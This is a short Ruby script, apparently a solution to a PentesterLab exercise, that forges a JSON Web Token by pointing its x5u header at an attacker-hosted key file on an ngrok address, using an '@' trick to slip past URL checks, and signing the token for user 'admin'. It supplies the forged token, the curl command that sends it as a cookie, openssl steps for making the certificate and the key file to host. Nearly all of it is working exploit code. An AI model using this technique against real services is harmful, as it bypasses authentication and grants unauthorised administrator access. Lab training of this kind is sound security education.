# eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dSI6Imh0dHA6Ly9wdGwtNGQ4NDI4ZWItNGQxMWNjYzQubGliY3VybC5zby8ud2VsbC1rbm93bi9qd2tzX3dpdGhfeDVjLmpzb24ifQ.eyJ1c2VyIjoiZGVtbyJ9.XmSFNUzpUGZBMDEpF96XXZ5KO8uiqKuIxWWVyhuaQKF8T-T-XjcmehNBZ5X6qPyrzlVpmkNwZzhbp5pfW8WEkqG-UR3ORymHgj7XJYSPD-PUX4psbzJ2nxlX4rlGKFc3MX2e_hZMs0ctT6I4MnjVjD85Jw1RsgUhyK1vEJTE6_KhsHyXBgT1PQy2B65_xt5vzaI55RiQG4MzbIJDbdlwr-VTlHbbF5fIuRap04OM8K8qKAAC1x_-LNhFwC8--5Ez6M8krBWFRso-juxew1n66WnWzI5yflU9T-cvFURniEBqjnV0KO4n4DRSUaDEZhjNf4tRva3ptssqG4wlPZ0KZw

# run with `curl -H "Cookie: auth=$(ruby JKU-jwt\ exploit.rb)" http://ptl-4d8428eb-4d11ccc4.libcurl.so/`

header = {"typ":"JWT","alg":"RS256","x5u":"http://ptl-4d8428eb-4d11ccc4.libcurl.so@f3e6-73-129-14-72.ngrok.io/jwks_with_x5c.json"} # insert public server with key (can get the format from the original "x5u") (@ used for bypass trick browser as username)
payload = {"user":"admin"}

require 'openssl'
require 'base64'
require 'json'

# openssl req -newkey rsa:2048 -nodes -keyout private.pem -x509 -days 365 -out hacker.crt -subj "/C=US/State=Maryland/L=Baltimore/O=NeonSec/CN=student"
# remove the begin cety and end in certificate => replace with the json x5u column
priv=OpenSSL::PKey::RSA.new File.read 'private.pem'

data = Base64.urlsafe_encode64(header.to_json, padding: false).gsub(/=+$/,"")+"."
data+= Base64.urlsafe_encode64(payload.to_json, padding: false).gsub(/=+$/,"")

sign = priv.sign("SHA256",data)

puts data+"."+Base64.urlsafe_encode64(sign,padding: false).gsub(/=+$/,"") # use this as new auth cookie

# mykey.json (replace the n or e from output above)
# {
#   "keys": [
#     {
#       "kty": "RSA",
#       "use": "sig",
#       "kid": "pentesterlab",
#       "x5c": "MIIDazCCAlOgAwIBAgIULdLhcmxhMqfoxYI3NHuvx24iUWwwDQYJKoZIhvcNAQELBQAwRTELMAkGA1UEBhMCVVMxEjAQBgNVBAcMCUJhbHRpbW9yZTEQMA4GA1UECgwHTmVvblNlYzEQMA4GA1UEAwwHc3R1ZGVudDAeFw0yMTA4MjYwMTMxMjVaFw0yMjA4MjYwMTMxMjVaMEUxCzAJBgNVBAYTAlVTMRIwEAYDVQQHDAlCYWx0aW1vcmUxEDAOBgNVBAoMB05lb25TZWMxEDAOBgNVBAMMB3N0dWRlbnQwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQCwLBzRAd+n88MiF52Qe7kQEtIOGcB5mRp2V3lwIrov1L2DbCM/+Exx01uO50LbuUfCTffHOVm2OGgcSvoAigBtESk5H4VeHSc63ygqI21PT8P+35awMLVlqyGMdwu01rUk8ywwtCrGMk88yQomDwl/15YquRa3FvGVggLH3/HnOtAtN5YNAUzmcLmEBpi23oXSKs98JxzOdqWmXRCjdHugQd7cwy6tiBevCVg9DleY0+3rIFW4wY9sNyRzR/Rh6usX/2A5A28M2n5MQ1FU5AqBYsdT/FMOX91uU5zQqUi4+iKBvpEGutHFb4L5aiduQrK+dVykP/A/uEViGExuSZNbAgMBAAGjUzBRMB0GA1UdDgQWBBSWmABceyon0ZtnqTM1WLTWI2zdvTAfBgNVHSMEGDAWgBSWmABceyon0ZtnqTM1WLTWI2zdvTAPBgNVHRMBAf8EBTADAQH/MA0GCSqGSIb3DQEBCwUAA4IBAQCWiByZw8BOka0IwoMERp7S4y7MzsflbhrEKQ711myXuWX8ZarR0iJPe2f6PXplKBRLatcdNI/GWv1HGgwYU9sghnHWXwgYXr7T+RDJt8YLcMeVZ31PQ/fKpsy+v4XlHcv2YYstTqlvvvvMPQCqc+Folbq0hQtaClw/CcmOIOdX+avazcVbjbVZj3xSSi7GfbXq4YENstBSx+cBzgBKLslt9l5LH/kwy2mczOf0T4DlhhA2SFpIaUlvr1uPXw8oVJicdDxIHWVHslIt5uJl2nAQdsf2Gjlo3A9qWonZKT/Q3Y5ywOL1UEAXEsAVPhhDchxHwg7zE6ABA6eFPkdjo5a2",
#       "alg": "RS256"
#     }
#   ]
# }
